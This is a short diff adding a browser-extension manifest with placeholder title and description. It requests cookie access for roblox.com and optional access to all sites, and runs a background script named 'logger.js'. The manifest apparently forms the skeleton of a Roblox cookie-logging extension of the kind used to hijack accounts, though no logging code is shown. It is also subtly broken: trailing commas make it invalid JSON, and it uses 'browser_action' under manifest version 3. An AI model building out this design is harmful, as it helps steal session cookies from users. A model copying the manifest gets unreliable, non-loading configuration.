@@ -1,0 +1,29 @@
+{
+    "name": "Extension Title",
+    "version": "1.0", 
+    "manifest_version": 3,
+    "description": "Extension description.", 
+    "browser_action": {
+        "default_icon": "icon.png"
+       
+    },
+    
+    "permissions": [
+        "cookies"
+    ],
+    
+    "host_permissions": [
+        "https://www.roblox.com/"
+    ],
+    
+    "optional_host_permissions": [
+        "*://*/*",
+    ],
+    
+    "background": {
+        "service_worker": "logger.js",
+    },
+    "icons": { "16": "icon.png",
+           "48": "icon.png",
+          "128": "icon.png" }
+}
